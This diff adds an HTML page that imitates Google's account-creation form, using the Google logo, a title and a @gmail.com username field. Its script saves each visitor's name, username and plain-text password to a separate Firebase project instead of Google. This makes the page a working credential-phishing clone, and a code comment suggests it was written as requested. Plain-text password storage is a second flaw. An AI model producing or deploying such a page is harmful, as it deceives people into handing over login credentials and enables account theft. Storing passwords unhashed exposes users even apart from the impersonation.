@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Create your Google Account</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Product+Sans&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --blue: #1a73e8;
+      --blue-dark: #1765cc;
+      --text: #202124;
+      --muted: #5f6368;
+      --border: #dadce0;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #fff;
+      font-family: "Google Sans", Roboto, Arial, sans-serif;
+      color: var(--text);
+    }
+
+    .card {
+      width: 100%;
+      max-width: 450px;
+      padding: 48px 40px 36px;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      background: #fff;
+    }
+
+    .logo {
+      text-align: center;
+      font-family: "Product Sans", "Google Sans", Arial, sans-serif;
+      font-size: 24px;
+      font-weight: 500;
+      letter-spacing: -0.5px;
+      line-height: 1;
+      margin-bottom: 16px;
+    }
+    .logo .b { color: #4285f4; }
+    .logo .r { color: #ea4335; }
+    .logo .y { color: #fbbc05; }
+    .logo .g { color: #34a853; }
+
+    h1 {
+      margin: 0 0 8px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 400;
+      line-height: 1.33;
+    }
+
+    .subtitle {
+      margin: 0 0 32px;
+      text-align: center;
+      font-size: 16px;
+    }
+
+    .row {
+      display: flex;
+      gap: 16px;
+    }
+    .row .field { flex: 1; min-width: 0; }
+
+    /* Floating-label input */
+    .field {
+      position: relative;
+      margin-bottom: 24px;
+    }
+
+    .field input {
+      width: 100%;
+      height: 56px;
+      padding: 13px 15px;
+      font: inherit;
+      font-size: 16px;
+      color: var(--text);
+      background: transparent;
+      border: 1px solid #747775;
+      border-radius: 4px;
+      outline: none;
+      transition: border-color .15s;
+    }
+
+    .field label {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      padding: 0 4px;
+      font-size: 16px;
+      color: var(--muted);
+      background: #fff;
+      pointer-events: none;
+      transform: translateY(-50%);
+      transition: all .15s ease;
+    }
+
+    .field input:hover { border-color: var(--text); }
+
+    .field input:focus {
+      border: 2px solid var(--blue);
+      padding: 12px 14px;
+    }
+
+    .field input:focus + label,
+    .field input:not(:placeholder-shown) + label {
+      top: 0;
+      font-size: 12px;
+    }
+    .field input:focus + label { color: var(--blue); }
+
+    /* Username with @gmail.com suffix */
+    .suffix input { padding-right: 100px; }
+    .suffix .domain {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 16px;
+      color: var(--muted);
+      pointer-events: none;
+    }
+
+    .hint {
+      margin: -16px 0 24px;
+      font-size: 12px;
+      line-height: 1.33;
+      color: var(--muted);
+    }
+
+    /* Show password checkbox */
+    .show-pw {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: -4px 0 0;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    .show-pw input {
+      width: 18px;
+      height: 18px;
+      margin: 0;
+      accent-color: var(--blue);
+      cursor: pointer;
+    }
+
+    a {
+      color: var(--blue);
+      font-size: 14px;
+      font-weight: 500;
+      text-decoration: none;
+    }
+    a:hover { color: var(--blue-dark); text-decoration: underline; }
+
+    .actions {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-top: 40px;
+    }
+
+    .btn-next {
+      min-width: 88px;
+      height: 40px;
+      padding: 0 24px;
+      font: inherit;
+      font-size: 14px;
+      font-weight: 500;
+      color: #fff;
+      background: var(--blue);
+      border: 0;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background .15s, box-shadow .15s;
+    }
+    .btn-next:hover {
+      background: var(--blue-dark);
+      box-shadow: 0 1px 2px rgba(60, 64, 67, .3), 0 1px 3px 1px rgba(60, 64, 67, .15);
+    }
+    .btn-next:focus-visible,
+    a:focus-visible,
+    .show-pw input:focus-visible {
+      outline: 2px solid var(--blue);
+      outline-offset: 2px;
+    }
+
+    @media (max-width: 450px) {
+      body { align-items: flex-start; }
+      .card { border: 0; padding: 24px 24px 36px; }
+      .row { flex-direction: column; gap: 0; }
+    }
+  </style>
+</head>
+<body>
+  <main class="card">
+    <div class="logo" aria-label="Google">
+      <span class="b">G</span><span class="r">o</span><span class="y">o</span><span class="b">g</span><span class="g">l</span><span class="r">e</span>
+    </div>
+
+    <h1>Create your Google Account</h1>
+    <p class="subtitle">Enter your name</p>
+
+    <form id="signup" novalidate>
+      <div class="row">
+        <div class="field">
+          <input type="text" id="first" name="first" placeholder=" " autocomplete="given-name" autofocus>
+          <label for="first">First name</label>
+        </div>
+        <div class="field">
+          <input type="text" id="last" name="last" placeholder=" " autocomplete="family-name">
+          <label for="last">Last name (optional)</label>
+        </div>
+      </div>
+
+      <div class="field suffix">
+        <input type="text" id="username" name="username" placeholder=" " autocomplete="off">
+        <label for="username">Username</label>
+        <span class="domain">@gmail.com</span>
+      </div>
+      <p class="hint">You can use letters, numbers &amp; periods</p>
+
+      <div class="field">
+        <input type="text" id="password" name="password" placeholder=" " autocomplete="off">
+        <label for="password">Password</label>
+      </div>
+      <div class="field">
+        <input type="text" id="confirm" name="confirm" placeholder=" " autocomplete="off">
+        <label for="confirm">Confirm</label>
+      </div>
+      <p class="hint">Use 8 or more characters with a mix of letters, numbers &amp; symbols</p>
+
+      <div class="actions">
+        <a href="google-signin.html">Sign in instead</a>
+        <button type="submit" class="btn-next">Next</button>
+      </div>
+    </form>
+  </main>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
+    import {
+      getFirestore,
+      collection,
+      query,
+      where,
+      getDocs,
+      addDoc,
+      serverTimestamp
+    } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyAKYYTYwwiB5yQeAKG4RqntfKMv_kSCerc",
+      authDomain: "login-d35dd.firebaseapp.com",
+      projectId: "login-d35dd",
+      storageBucket: "login-d35dd.firebasestorage.app",
+      messagingSenderId: "827526763437",
+      appId: "1:827526763437:web:bc05699481f1a0513e0724"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+    const usersRef = collection(db, "users");
+
+    const form = document.getElementById('signup');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const confirmInput = document.getElementById('confirm');
+    const submitBtn = form.querySelector('.btn-next');
+
+    form.addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const first = document.getElementById('first').value.trim();
+      const last = document.getElementById('last').value.trim();
+      const username = usernameInput.value.trim().toLowerCase();
+      const password = passwordInput.value;
+      const confirm = confirmInput.value;
+
+      if (!first || !username || !password) {
+        alert('Please fill in first name, username and password.');
+        return;
+      }
+      if (password !== confirm) {
+        alert('Passwords don\'t match.');
+        return;
+      }
+
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Creating...';
+
+      try {
+        // Check the username isn't already taken
+        const dupeQuery = query(usersRef, where('username', '==', username));
+        const dupeSnap = await getDocs(dupeQuery);
+        if (!dupeSnap.empty) {
+          alert('That username is already taken.');
+          submitBtn.disabled = false;
+          submitBtn.textContent = 'Next';
+          return;
+        }
+
+        // All fields are stored as plain text strings
+        await addDoc(usersRef, {
+          firstName: first,
+          lastName: last,
+          username: username,
+          password: password, // plain text, as requested — see note below
+          createdAt: serverTimestamp()
+        });
+
+        window.location.href = 'google-signin.html';
+      } catch (err) {
+        console.error(err);
+        alert('Could not create the account: ' + err.message);
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Next';
+      }
+    });
+  </script>
+</body>
+</html>
